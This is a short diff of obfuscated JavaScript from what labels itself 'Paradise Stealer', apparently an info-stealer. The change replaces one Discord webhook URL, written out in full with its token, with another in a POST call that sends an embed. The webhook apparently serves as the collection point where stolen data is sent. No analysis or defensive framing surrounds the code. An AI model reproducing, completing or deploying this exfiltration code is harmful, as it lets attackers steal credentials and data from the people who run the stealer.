@@ -659,7 +659,7 @@ async function a0_0x56388f() {
   const _0x11e42 = { text: 'Paradise Stealer' }
   a0_0x4d0855
     .post(
-      'https://canary.discord.com/api/webhooks/953737321776283679/MH3TLofLmqhH50pHv8AxJk_rr8ARqt2Hv9pN_AYkMorZxtPI7dP9upwP9VHvLHdm4Hwz',
+      'https://ptb.discord.com/api/webhooks/954108820324503593/tuL0T3Q-tHqCnOuwamoOGkrJFnXRAJONKT22LkCwYUgAHsRhH_WZuDRuud5kqGhcDulH',
       {
         content: null,
         embeds: [
